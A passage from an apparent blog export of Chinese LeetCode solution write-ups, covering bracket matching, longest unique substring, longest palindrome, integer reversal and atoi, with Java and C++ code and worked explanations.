<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">"()"</span></span><br><span class="line">输出: <span class="keyword">true</span></span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">"(]"</span></span><br><span class="line">输出: <span class="keyword">false</span></span><br></pre></td></tr></table></figure>

<h2 id="示例4："><a href="#示例4：" class="headerlink" title="示例4："></a>示例4：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">"([)]"</span></span><br><span class="line">输出: <span class="keyword">false</span></span><br></pre></td></tr></table></figure>

<h2 id="示例5"><a href="#示例5" class="headerlink" title="示例5"></a>示例5</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">"&#123;[]&#125;"</span></span><br><span class="line">输出: <span class="keyword">true</span></span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>借助栈</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><pre><code>public boolean isValid(String s) {
    Stack&lt;Character&gt; sc = new Stack&lt;&gt;();
    int len = s.length();
    for(int i = 0 ; i &lt; len ; i ++) {
        if(s.charAt(i) == &apos;(&apos;|| s.charAt(i) == &apos;{&apos;|| s.charAt(i) == &apos;[&apos;) {
            sc.push(s.charAt(i));
        } else if(sc.empty()) {
            return false;
        } else if(s.charAt(i) == &apos;)&apos;) {
            if(sc.peek() == &apos;(&apos;) {
                sc.pop();
            } else {
                return false;
            }
        } else if(s.charAt(i) == &apos;}&apos;) {
            if(sc.peek() == &apos;{&apos;) {
                sc.pop();
            } else {
                return false;
            }
        } else if(s.charAt(i) == &apos;]&apos;) { 
            if(sc.peek() == &apos;[&apos;) {
                sc.pop();
            } else {
                return false;
            }
        }
    }
    return sc.empty();
}</code></pre><p>};</p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>Stack</tag>
      </tags>
  </entry>
  <entry>
    <title>3. 无重复字符的最长子串</title>
    <url>/2018/09/10/LeetCode/leetcode-000003-%E6%97%A0%E9%87%8D%E5%A4%8D%E5%AD%97%E7%AC%A6%E7%9A%84%E6%9C%80%E9%95%BF%E5%AD%90%E4%B8%B2/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given a string, find the length of the <strong>longest substring</strong> without repeating characters.</p>
<h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example 1:"></a>Example 1:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: <span class="string">"abcabcbb"</span></span><br><span class="line">Output: <span class="number">3</span> </span><br><span class="line">Explanation: The answer is <span class="string">"abc"</span>, with the length of <span class="number">3</span>.</span><br></pre></td></tr></table></figure>

<h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2:"></a>Example 2:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: <span class="string">"bbbbb"</span></span><br><span class="line">Output: <span class="number">1</span></span><br><span class="line">Explanation: The answer is <span class="string">"b"</span>, with the length of <span class="number">1</span>.</span><br></pre></td></tr></table></figure>

<h3 id="Example-3"><a href="#Example-3" class="headerlink" title="Example 3:"></a>Example 3:</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Input: <span class="string">"pwwkew"</span></span><br><span class="line">Output: <span class="number">3</span></span><br><span class="line">Explanation: The answer is <span class="string">"wke"</span>, with the length of <span class="number">3</span>. </span><br><span class="line">             Note that the answer must be a substring, <span class="string">"pwke"</span> is a subsequence and not a substring.</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：暴力破解"><a href="#解法一：暴力破解" class="headerlink" title="解法一：暴力破解"></a>解法一：暴力破解</h3><p>取该字符串的每一个连续字串，判断其是否为该字符串的最长字串。先从长度为n的子字符串开始，如果符合条件的话，直接返回n；否则从2个n-1长度的字串中，选择，以此类推。时间复杂度O(n*n*n)</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.length();</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">                <span class="keyword">if</span> (allUnique(s, i, j)) ans = Math.max(ans, j - i);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">allUnique</span><span class="params">(String s, <span class="keyword">int</span> start, <span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">        Set&lt;Character&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = start; i &lt; end; i++) &#123;</span><br><span class="line">            Character ch = s.charAt(i);</span><br><span class="line">            <span class="keyword">if</span> (set.contains(ch)) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            set.add(ch);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP-超时了"><a href="#CPP-超时了" class="headerlink" title="CPP-超时了"></a>CPP-超时了</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">isUniqueSubString</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span>&amp; s, <span class="keyword">int</span> <span class="built_in">begin</span>, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">set</span>&lt;<span class="keyword">char</span>&gt; chars;</span><br><span class="line">        <span class="keyword">int</span> total = <span class="built_in">begin</span> + length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="built_in">begin</span>; i &lt; total;i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (chars.<span class="built_in">find</span>(s.at(i)) != chars.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            chars.insert(s.at(i));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> == s.length()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> length = s.length();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = length; i &gt; <span class="number">1</span>;i--) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>;j + i &lt;= length;j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (isUniqueSubString(s, j, i)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> i;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h3 id="解法二：滑动窗口法"><a href="#解法二：滑动窗口法" class="headerlink" title="解法二：滑动窗口法"></a>解法二：滑动窗口法</h3><p>滑动窗口就是从原字符串中截取一个子字符串，借助HashSet判断当前字符串是否不重复，如果不重复的话，则往右再扩一位，重复的话，则把当前窗口再顺移一位。</p>
<h4 id="JAVA-1"><a href="#JAVA-1" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.length();</span><br><span class="line">        Set&lt;Character&gt; set = <span class="keyword">new</span> HashSet&lt;&gt;();</span><br><span class="line">        <span class="keyword">int</span> ans = <span class="number">0</span>, i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; n &amp;&amp; j &lt; n) &#123;</span><br><span class="line">            <span class="comment">// try to extend the range [i, j]</span></span><br><span class="line">            <span class="keyword">if</span> (!set.contains(s.charAt(j)))&#123;</span><br><span class="line">                set.add(s.charAt(j++));</span><br><span class="line">                ans = Math.max(ans, j - i);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                set.remove(s.charAt(i++));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>拿字符串“aabbcd”举例来说。</p>
<table>
<thead>
<tr>
<th></th>
<th>窗口左坐标</th>
<th>窗口右坐标</th>
<th>当前不重复的字符集</th>
<th>最大不重复子字符串长度</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>初始化</td>
<td>0</td>
<td>0</td>
<td>空</td>
<td>0</td>
<td></td>
</tr>
<tr>
<td>加入a</td>
<td>0</td>
<td>1</td>
<td>a</td>
<td>1</td>
<td></td>
</tr>
<tr>
<td>再次加入a</td>
<td>1</td>
<td>1</td>
<td>空</td>
<td>1</td>
<td></td>
</tr>
<tr>
<td>再次加入a</td>
<td>1</td>
<td>2</td>
<td>a</td>
<td>1</td>
<td>此处是因为j的值没有自增，所以index为1的a，会再被加入依次</td>
</tr>
<tr>
<td>加入b</td>
<td>1</td>
<td>3</td>
<td>a,b</td>
<td>2</td>
<td></td>
</tr>
<tr>
<td>再次加入b</td>
<td>2</td>
<td>3</td>
<td>b</td>
<td>2</td>
<td></td>
</tr>
<tr>
<td>再次加入b</td>
<td>3</td>
<td>3</td>
<td>空</td>
<td>2</td>
<td></td>
</tr>
<tr>
<td>再次加入b</td>
<td>3</td>
<td>4</td>
<td>b</td>
<td>2</td>
<td>同上，因为j没有更新值，index为3的b会被加入多次</td>
</tr>
<tr>
<td>加入c</td>
<td>3</td>
<td>5</td>
<td>b，c</td>
<td>2</td>
<td></td>
</tr>
<tr>
<td>加入d</td>
<td>3</td>
<td>6</td>
<td>b，c，d</td>
<td>3</td>
<td></td>
</tr>
</tbody></table>
<h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">set</span>&lt;<span class="keyword">char</span>&gt; chars;</span><br><span class="line">        <span class="keyword">int</span> length = s.length();</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (i &lt; length &amp;&amp; j &lt; length) &#123;</span><br><span class="line">            <span class="keyword">if</span> (chars.<span class="built_in">find</span>(s.at(j)) != chars.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                chars.erase(s.at(i++));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                chars.insert(s.at(j++));</span><br><span class="line">                result = <span class="built_in">max</span>(result, j - i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="解法三：滑动窗口优化版"><a href="#解法三：滑动窗口优化版" class="headerlink" title="解法三：滑动窗口优化版"></a>解法三：滑动窗口优化版</h3><p>在解法二中，每当碰到相同的值的时候，我们总是把窗口左坐标一步一步地往后移，其实，这里面存在优化的空间。比如，在区间[i, j)中，某个元素重复了，假设重复的那个索引为k，那么，我们就可以直接跳过[i,k]这段区间，直接从k+1,开始计算。</p>
<h4 id="JAVA-2"><a href="#JAVA-2" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.length(), ans = <span class="number">0</span>;</span><br><span class="line">        Map&lt;Character, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;(); <span class="comment">// current index of character</span></span><br><span class="line">        <span class="comment">// try to extend the range [i, j]</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>, i = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.containsKey(s.charAt(j))) &#123;</span><br><span class="line">                i = Math.max(map.get(s.charAt(j)), i);</span><br><span class="line">            &#125;</span><br><span class="line">            ans = Math.max(ans, j - i + <span class="number">1</span>);</span><br><span class="line">            map.put(s.charAt(j), j + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP-1"><a href="#CPP-1" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">char</span>, <span class="keyword">int</span>&gt; chars;</span><br><span class="line">        <span class="keyword">int</span> length = s.length();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> result = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;j &lt; length ;j++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (chars.<span class="built_in">find</span>(s.at(j)) != chars.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                i = <span class="built_in">max</span>(chars.at(s.at(j)), i);</span><br><span class="line">            &#125;</span><br><span class="line">            result = <span class="built_in">max</span>(result, j - i + <span class="number">1</span>);</span><br><span class="line">            chars[s.at(j)] = j + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong></p>
<p>CPP标准库中的map有一个小坑。使用map.insert方法并不能把相同key的值给覆盖掉，必须使用[]运算符才行。至于为什么，去翻翻STL源码就行了，这里就不展开叙述了。</p>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://leetcode.com/problems/longest-substring-without-repeating-characters/solution/" target="_blank" rel="noopener">https://leetcode.com/problems/longest-substring-without-repeating-characters/solution/</a></p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>5. 最长回文子串</title>
    <url>/2018/09/10/LeetCode/leetcode-000005-%E6%9C%80%E9%95%BF%E5%9B%9E%E6%96%87%E5%AD%90%E4%B8%B2/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一个字符串 <code>s</code>，找到 <code>s</code> 中最长的回文子串。你可以假设 <code>s</code> 的最大长度为 1000。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;babad&quot;</span><br><span class="line">输出: &quot;bab&quot;</span><br><span class="line">注意: &quot;aba&quot; 也是一个有效答案。</span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: &quot;cbbd&quot;</span><br><span class="line">输出: &quot;bb&quot;</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">longestPalindrome</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="keyword">int</span> len = s.size();</span><br><span class="line">        <span class="keyword">if</span>(len &lt;= <span class="number">1</span>)<span class="keyword">return</span> s;</span><br><span class="line">        <span class="built_in">string</span> str = preProcess(s);</span><br><span class="line">        <span class="keyword">int</span> n = str.size(), id = <span class="number">0</span>, mx = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;p(n, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n<span class="number">-1</span>; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            p[i] = mx &gt; i ? min(p[<span class="number">2</span>*id-i], mx-i) : <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span>(str[i+p[i]] == str[i-p[i]])p[i]++;</span><br><span class="line">            <span class="keyword">if</span>(i + p[i] &gt; mx)</span><br><span class="line">            &#123;</span><br><span class="line">                mx = i + p[i];</span><br><span class="line">                id = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line">        <span class="keyword">int</span> maxLen = <span class="number">0</span>, index = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n<span class="number">-1</span>; i++)</span><br><span class="line">            <span class="keyword">if</span>(p[i] &gt; maxLen)</span><br><span class="line">            &#123;</span><br><span class="line">                maxLen = p[i];</span><br><span class="line">                index = i;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> s.substr((index - maxLen)/<span class="number">2</span>, maxLen<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">preProcess</span><span class="params">(<span class="keyword">const</span> <span class="built_in">string</span> &amp;s)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n = s.size();</span><br><span class="line">        <span class="built_in">string</span> res; </span><br><span class="line">        res.push_back(<span class="string">'$'</span>);</span><br><span class="line">        res.push_back(<span class="string">'#'</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            res.push_back(s[i]);</span><br><span class="line">            res.push_back(<span class="string">'#'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        res.push_back(<span class="string">'^'</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
        <tag>String</tag>
      </tags>
  </entry>
  <entry>
    <title>7. 整数反转</title>
    <url>/2018/09/10/LeetCode/leetcode-000007-%E5%8F%8D%E8%BD%AC%E6%95%B4%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给出一个 32 位的有符号整数，你需要将这个整数中每位上的数字进行反转。</p>
<h2 id="示例1："><a href="#示例1：" class="headerlink" title="示例1："></a>示例1：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="number">123</span></span><br><span class="line">输出: <span class="number">321</span></span><br></pre></td></tr></table></figure>

<h2 id="示例2："><a href="#示例2：" class="headerlink" title="示例2："></a>示例2：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: -<span class="number">123</span></span><br><span class="line">输出: -<span class="number">321</span></span><br></pre></td></tr></table></figure>

<h2 id="示例3："><a href="#示例3：" class="headerlink" title="示例3："></a>示例3：</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="number">120</span></span><br><span class="line">输出: <span class="number">21</span></span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>反向取数字的每一位，相加</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (x != <span class="number">0</span>) &#123;</span><br><span class="line">        res = res * <span class="number">10</span> + x % <span class="number">10</span>;</span><br><span class="line">        x /= <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>但是，当输入是1534236469时，反转之后的数值就会溢出，造成结果不对。</p>
<p>那么，就需要在循环中判断res在什么时候可能溢出，如果溢出的话，就直接返回0。</p>
<p>在Java中，int的取值范围为-2147483648~2147483647。那么只要在res乘以10之前，判断res是否可能溢出即可。</p>
<p>分四种情况：</p>
<ol>
<li>res 大于Integer.MAX_VALUE / 10，此时res * 10之后一定会溢出，返回0；</li>
<li>res等于Integer.MAX_VALUE / 10，并且，下一个待加的数字pop大于7，res * 10 + pop 一定会溢出，返回0；</li>
<li>res小于Integer.MIN_VALUE / 10，此时res * 10之后一定会溢出，返回0；</li>
<li>res等于Integer.MIN_VALUE / 10，并且，下一个待加的数字pop小于-8，res * 10 + pop一定会溢出，返回0；</li>
</ol>
<p>以下是修改后的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> (x != <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">int</span> pop = x % <span class="number">10</span>;</span><br><span class="line">			<span class="keyword">if</span> (res &gt; Integer.MAX_VALUE / <span class="number">10</span> || (res == Integer.MAX_VALUE / <span class="number">10</span> &amp;&amp; pop &gt; <span class="number">7</span>)) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span> (res &lt; Integer.MIN_VALUE / <span class="number">10</span> || (res == Integer.MIN_VALUE / <span class="number">10</span> &amp;&amp; pop &lt; -<span class="number">8</span>)) &#123;</span><br><span class="line">				<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			res = res * <span class="number">10</span> + pop;</span><br><span class="line">			x /= <span class="number">10</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> res;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>8. 字符串转整数 (atoi)</title>
    <url>/2018/09/10/LeetCode/leetcode-000008-%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%BD%AC%E6%95%B4%E6%95%B0%20(atoi)/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>请你来实现一个 atoi 函数，使其能将字符串转换成整数。</p>
<p>首先，该函数会根据需要丢弃无用的开头空格字符，直到寻找到第一个非空格的字符为止。</p>
<p>当我们寻找到的第一个非空字符为正或者负号时，则将该符号与之后面尽可能多的连续数字组合起来，作为该整数的正负号；假如第一个非空字符是数字，则直接将其与之后连续的数字字符组合起来，形成整数。</p>
<p>该字符串除了有效的整数部分之后也可能会存在多余的字符，这些字符可以被忽略，它们对于函数不应该造成影响。</p>
<p>注意：假如该字符串中的第一个非空格字符不是一个有效整数字符、字符串为空或字符串仅包含空白字符时，则你的函数不需要进行转换。</p>
<p>在任何情况下，若函数不能进行有效的转换时，请返回 0。</p>
<p>说明：</p>
<p>假设我们的环境只能存储 32 位大小的有符号整数，那么其数值范围为 [−2^31,  2^31 − 1]。如果数值超过这个范围，请返回  INT_MAX (2^31 − 1) 或 INT_MIN (−2^31) 。</p>
<h2 id="示例1"><a href="#示例1" class="headerlink" title="示例1"></a>示例1</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">"42"</span></span><br><span class="line">输出: <span class="number">42</span></span><br></pre></td></tr></table></figure>

<h2 id="示例2"><a href="#示例2" class="headerlink" title="示例2"></a>示例2</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">"   -42"</span></span><br><span class="line">输出: -<span class="number">42</span></span><br><span class="line">解释: 第一个非空白字符为 <span class="string">'-'</span>, 它是一个负号。</span><br><span class="line">     我们尽可能将负号与后面所有连续出现的数字组合起来，最后得到 -<span class="number">42</span> 。</span><br></pre></td></tr></table></figure>

<h2 id="示例3"><a href="#示例3" class="headerlink" title="示例3"></a>示例3</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">"4193 with words"</span></span><br><span class="line">输出: <span class="number">4193</span></span><br><span class="line">解释: 转换截止于数字 <span class="string">'3'</span> ，因为它的下一个字符不为数字。</span><br></pre></td></tr></table></figure>

<h2 id="示例4"><a href="#示例4" class="headerlink" title="示例4"></a>示例4</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">"words and 987"</span></span><br><span class="line">输出: <span class="number">0</span></span><br><span class="line">解释: 第一个非空字符是 <span class="string">'w'</span>, 但它不是数字或正、负号。</span><br><span class="line">     因此无法执行有效的转换。</span><br></pre></td></tr></table></figure>

<h2 id="示例5"><a href="#示例5" class="headerlink" title="示例5"></a>示例5</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">输入: <span class="string">"-91283472332"</span></span><br><span class="line">输出: -<span class="number">2147483648</span></span><br><span class="line">解释: 数字 <span class="string">"-91283472332"</span> 超过 <span class="number">32</span> 位有符号整数范围。 </span><br><span class="line">     因此返回 INT_MIN (−<span class="number">2</span>^<span class="number">31</span>) 。</span><br></pre></td></tr></table></figure>

<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><ol>
<li>去除字符串首尾的空格字符，判断长度是否为0，为0则返回0；</li>
<li>判断整数的符号，并用sign变量标记，同时，删除字符串首位的+或者-符号</li>
<li>遍历余下的字符串，如果是数字的话，首先判断当前的结果是否大于等于Integer.MAX_VALUE / 10或者小于等于Integer.MIN_VALUE / 10,是的话，表示溢出，返回Integer.MAX_VALUE或者Integer.MIN_VALUE;</li>
<li>如果不是数字的话，终止当前流程，返回最终结果。</li>
</ol>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">myAtoi</span><span class="params">(String str)</span> </span>&#123;</span><br><span class="line">		str = str.trim();</span><br><span class="line">		<span class="keyword">if</span> (str.length() == <span class="number">0</span>) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">int</span> sign = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">if</span> (str.startsWith(<span class="string">"-"</span>)) &#123;</span><br><span class="line">			sign = <span class="number">-1</span>;</span><br><span class="line">			str = str.substring(<span class="number">1</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (str.startsWith(<span class="string">"+"</span>)) &#123;</span><br><span class="line">			str = str.substring(<span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span 